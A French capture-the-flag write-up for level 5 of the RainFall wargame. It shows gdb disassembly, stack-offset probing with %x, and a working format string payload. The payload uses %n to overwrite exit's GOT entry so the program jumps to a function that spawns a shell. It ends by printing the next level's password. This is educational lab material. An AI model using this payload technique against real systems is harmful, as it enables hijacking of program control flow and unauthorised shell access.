
# Level 5

On vas encore une fois utiliser une format string attaque. Cette fois nous avons une fonction `n` appeler dans le main qui va appeler comme les fois precedante printf avec le retour de l'entrer standard lue avec `fget`. Mais cette foi pas de condition qui donne les droit, elle exit apres le printf, par contre nous avons une fonction `o` a l'adresse `0x080484a4` non-appeler qui execute un `"/bin/sh"` donc il faut donc appeler la fonction `o` a la place de `exite`. Il faut maintenant trouver l'adresse d'`exit` pour ce faire on va ouvrir la fonction `n` avec *gdb*
```
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```
On ne peut pas ecrire sur l'*EIP* car le progrmme ce terminerais avant. Mais on peut remplacer l'adresse de sortie dans le GOT par l'adresse de "o", pour l'appeler au lieu de exit.
```
(gdb) x/i 0x80483d0
   0x80483d0 <exit@plt>:        jmp    *0x8049838
(gdb) 
```
En utilisant la meme logique que les levels precedents on cherche la position dans la stack ici on voit que l'adresse est en 4 position.
```
level5@RainFall:~$ python -c "print 'aaaa' + ' %x' * 4" | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161
level5@RainFall:~$
```
On injecte donc l'adresse de la fonction o a la place de l'exit initialement appeler. Etant donner que nous utilison `%n` Il faut donner l'adresse de o en decimal - 4 octets
-  `0x080484a4` = 134513828
- 134513828 - 4 = 134513824
```
level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%134513824d%4\$n'" > /tmp/payload
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```